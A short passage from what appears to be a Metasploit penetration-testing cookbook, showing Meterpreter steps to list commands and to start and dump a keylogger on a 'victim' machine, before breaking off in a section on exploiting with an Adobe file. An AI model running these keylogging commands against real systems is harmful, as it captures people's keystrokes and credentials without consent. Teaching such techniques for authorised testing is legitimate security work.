    Chapter 6


    12. To show a list of `Meterpreter` commands that we can run, type `help`:


    ```bash

    help

    ```


    13. A list of available commands will display. In this case, we start:


    ```bash

    keys_start

    ```


    14. To get the keystrokes from our victim, we issue:


    ```bash

    keys_dump

    ```


    ### How it works...


    In this recipe, we used Metasploit''s `MSFCONSOLE` to exploit and create an Adobe
